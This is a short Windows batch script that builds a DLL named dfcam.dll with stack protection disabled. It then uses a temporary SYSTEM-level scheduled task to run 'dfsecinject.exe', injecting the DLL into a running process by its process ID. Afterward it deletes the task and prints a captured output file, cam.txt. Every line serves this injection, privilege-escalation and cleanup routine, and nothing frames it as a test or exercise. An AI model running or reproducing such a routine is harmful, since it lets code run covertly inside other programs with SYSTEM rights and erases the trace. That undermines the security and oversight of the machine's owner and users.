@echo off
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul
cd /d C:\Users\User\trackA
cl /nologo /std:c++17 /O2 /EHsc /MT /GS- /LD dfcam.cpp /Fe:dfcam.dll /link user32.lib > cam_build.log 2>&1
echo CAMB=%errorlevel%
type cam_build.log
schtasks /create /tn dfa_cam /tr "C:\Users\User\trackA\dfsecinject.exe 50552 C:\Users\User\trackA\dfcam.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f >nul
schtasks /run /tn dfa_cam
ping -n 6 127.0.0.1 >nul
schtasks /delete /tn dfa_cam /f >nul
type cam.txt
